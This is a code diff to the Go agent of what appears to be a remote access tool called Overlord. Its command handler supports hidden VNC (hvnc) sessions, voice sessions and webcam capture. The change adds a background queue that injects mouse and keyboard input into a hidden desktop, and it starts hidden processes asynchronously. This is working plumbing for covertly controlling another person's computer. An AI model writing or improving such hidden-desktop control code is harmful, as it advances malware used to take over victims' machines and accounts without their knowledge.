@@ -10,6 +10,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"overlord-client/cmd/agent/audio"
@@ -28,7 +29,31 @@ var (
 	activeCommandsMu sync.Mutex
 	voiceSessionMu   sync.Mutex
 	voiceSession     *voiceRuntime
+	hvncInputOnce    sync.Once
+	hvncInputQueue   chan hvncInputEvent
+	hvncInputDropped atomic.Uint64
 )
+
+type hvncInputKind int
+
+const (
+	hvncInputMouseMove hvncInputKind = iota
+	hvncInputMouseDown
+	hvncInputMouseUp
+	hvncInputMouseWheel
+	hvncInputKeyDown
+	hvncInputKeyUp
+)
+
+type hvncInputEvent struct {
+	kind    hvncInputKind
+	display int
+	x       int32
+	y       int32
+	button  int
+	delta   int32
+	vk      uint16
+}
 
 type voiceRuntime struct {
 	sessionID string
@@ -129,6 +154,87 @@ func waitStreamStop(done <-chan struct{}, name string) {
 		return
 	case <-time.After(2 * time.Second):
 		log.Printf("%s: stop timed out", name)
+	}
+}
+
+func ensureHVNCInputWorker() {
+	hvncInputOnce.Do(func() {
+		hvncInputQueue = make(chan hvncInputEvent, 1024)
+		goSafe("hvnc input worker", nil, func() {
+			for ev := range hvncInputQueue {
+				switch ev.kind {
+				case hvncInputMouseMove:
+					if err := capture.HVNCInputMouseMove(ev.display, ev.x, ev.y); err != nil {
+						log.Printf("hvnc input worker: mouse_move failed: %v", err)
+					}
+				case hvncInputMouseDown:
+					if ev.x != 0 || ev.y != 0 {
+						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
+					}
+					if err := capture.HVNCInputMouseDown(ev.button); err != nil {
+						log.Printf("hvnc input worker: mouse_down failed: %v", err)
+					}
+				case hvncInputMouseUp:
+					if ev.x != 0 || ev.y != 0 {
+						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
+					}
+					if err := capture.HVNCInputMouseUp(ev.button); err != nil {
+						log.Printf("hvnc input worker: mouse_up failed: %v", err)
+					}
+				case hvncInputMouseWheel:
+					if ev.x != 0 || ev.y != 0 {
+						_ = capture.HVNCInputMouseMove(ev.display, ev.x, ev.y)
+					}
+					if err := capture.HVNCInputMouseWheel(ev.delta); err != nil {
+						log.Printf("hvnc input worker: mouse_wheel failed: %v", err)
+					}
+				case hvncInputKeyDown:
+					if err := capture.HVNCInputKeyDown(ev.vk); err != nil {
+						log.Printf("hvnc input worker: key_down vk=%d failed: %v", ev.vk, err)
+					}
+				case hvncInputKeyUp:
+					if err := capture.HVNCInputKeyUp(ev.vk); err != nil {
+						log.Printf("hvnc input worker: key_up vk=%d failed: %v", ev.vk, err)
+					}
+				}
+			}
+		})
+	})
+}
+
+func enqueueHVNCInput(ev hvncInputEvent) {
+	ensureHVNCInputWorker()
+	select {
+	case hvncInputQueue <- ev:
+		return
+	default:
+		if ev.kind == hvncInputMouseMove {
+			dropped := hvncInputDropped.Add(1)
+			if dropped%100 == 1 {
+				log.Printf("hvnc input queue: dropping mouse_move events dropped=%d", dropped)
+			}
+			return
+		}
+		t := time.NewTimer(200 * time.Millisecond)
+		defer t.Stop()
+		select {
+		case hvncInputQueue <- ev:
+		case <-t.C:
+			log.Printf("hvnc input queue: enqueue timeout kind=%d", ev.kind)
+		}
+	}
+}
+
+func clearHVNCInputQueue() {
+	if hvncInputQueue == nil {
+		return
+	}
+	for {
+		select {
+		case <-hvncInputQueue:
+		default:
+			return
+		}
 	}
 }
 
@@ -685,6 +791,10 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 	case "hvnc_stop":
 		env.HVNCMu.Lock()
 		log.Printf("hvnc: stop requested")
+		env.HVNCMouseControl = false
+		env.HVNCKeyboardControl = false
+		env.HVNCCursorCapture = false
+		clearHVNCInputQueue()
 		if env.HVNCCancel != nil {
 			env.HVNCCancel()
 		}
@@ -832,9 +942,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				y = int32(v)
 			}
 		}
-		log.Printf("hvnc: mouse move %d,%d", x, y)
-		_ = capture.HVNCInputMouseMove(env.HVNCSelectedDisplay, x, y)
-		sendCommandResultSafe(env, cmdID, true, "")
+		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseMove, display: env.HVNCSelectedDisplay, x: x, y: y})
 		return nil
 	case "hvnc_mouse_down":
 		if !env.HVNCMouseControl {
@@ -925,11 +1033,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		log.Printf("hvnc: mouse down %d", btn)
-		if x != 0 || y != 0 {
-			_ = capture.HVNCInputMouseMove(env.HVNCSelectedDisplay, x, y)
-		}
-		_ = capture.HVNCInputMouseDown(btn)
-		sendCommandResultSafe(env, cmdID, true, "")
+		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseDown, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
 		return nil
 	case "hvnc_mouse_up":
 		if !env.HVNCMouseControl {
@@ -1020,11 +1124,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		log.Printf("hvnc: mouse up %d", btn)
-		if x != 0 || y != 0 {
-			_ = capture.HVNCInputMouseMove(env.HVNCSelectedDisplay, x, y)
-		}
-		_ = capture.HVNCInputMouseUp(btn)
-		sendCommandResultSafe(env, cmdID, true, "")
+		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseUp, display: env.HVNCSelectedDisplay, button: btn, x: x, y: y})
 		return nil
 	case "hvnc_mouse_wheel":
 		if !env.HVNCMouseControl {
@@ -1114,11 +1214,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 				y = int32(v)
 			}
 		}
-		if x != 0 || y != 0 {
-			_ = capture.HVNCInputMouseMove(env.HVNCSelectedDisplay, x, y)
-		}
-		_ = capture.HVNCInputMouseWheel(delta)
-		sendCommandResultSafe(env, cmdID, true, "")
+		enqueueHVNCInput(hvncInputEvent{kind: hvncInputMouseWheel, display: env.HVNCSelectedDisplay, delta: delta, x: x, y: y})
 		return nil
 	case "hvnc_key_down":
 		if !env.HVNCKeyboardControl {
@@ -1134,9 +1230,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
 			log.Printf("hvnc: key down code=%s vk=%d", code, vk)
-			_ = capture.HVNCInputKeyDown(vk)
+			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyDown, vk: vk})
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "hvnc_key_up":
 		if !env.HVNCKeyboardControl {
@@ -1152,9 +1247,8 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		}
 		if vk := keyCodeToVKHVNC(code); vk != 0 {
 			log.Printf("hvnc: key up code=%s vk=%d", code, vk)
-			_ = capture.HVNCInputKeyUp(vk)
+			enqueueHVNCInput(hvncInputEvent{kind: hvncInputKeyUp, vk: vk})
 		}
-		sendCommandResultSafe(env, cmdID, true, "")
 		return nil
 	case "hvnc_start_process":
 		payload, _ := envelope["payload"].(map[string]interface{})
@@ -1165,12 +1259,12 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 			}
 		}
 		log.Printf("hvnc: start process %q", filePath)
-		err := capture.StartHVNCProcess(filePath)
-		if err != nil {
-			sendCommandResultSafe(env, cmdID, false, err.Error())
-			return nil
-		}
 		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_start_process", nil, func() {
+			if err := capture.StartHVNCProcess(filePath); err != nil {
+				log.Printf("hvnc: start process failed for %q: %v", filePath, err)
+			}
+		})
 		return nil
 
 	case "webcam_start":
